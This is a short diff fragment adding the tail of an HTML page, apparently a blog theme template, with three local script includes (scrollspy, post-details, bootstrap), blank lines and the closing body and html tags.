+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
